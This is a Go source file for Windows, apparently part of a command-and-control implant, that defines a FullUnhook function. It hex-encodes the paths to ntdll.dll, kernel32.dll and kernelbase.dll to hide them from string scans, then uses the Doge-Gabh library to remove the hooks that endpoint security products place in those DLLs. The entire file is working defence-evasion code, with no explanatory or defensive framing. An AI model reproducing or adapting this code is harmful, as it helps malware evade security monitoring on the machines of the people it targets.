//go:build windows

package packet

import (
	"encoding/hex"
	"errors"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"main/sysinfo"
)

func FullUnhook() error {
	isOSX64, _ := sysinfo.IsOSX64()
	if !isOSX64 {
		return errors.New("Unhooking is not supported on windows x86 now.")
	}
	name1, _ := hex.DecodeString("633a5c77696e646f77735c73797374656d33325c6e74646c6c2e646c6c")
	name2, _ := hex.DecodeString("633a5c77696e646f77735c73797374656d33325c6b65726e656c33322e646c6c")
	name3, _ := hex.DecodeString("633a5c77696e646f77735c73797374656d33325c6b65726e656c626173652e646c6c")
	dlls := []string{string(name1), string(name2), string(name3)}
	return gabh.FullUnhook(dlls)
}
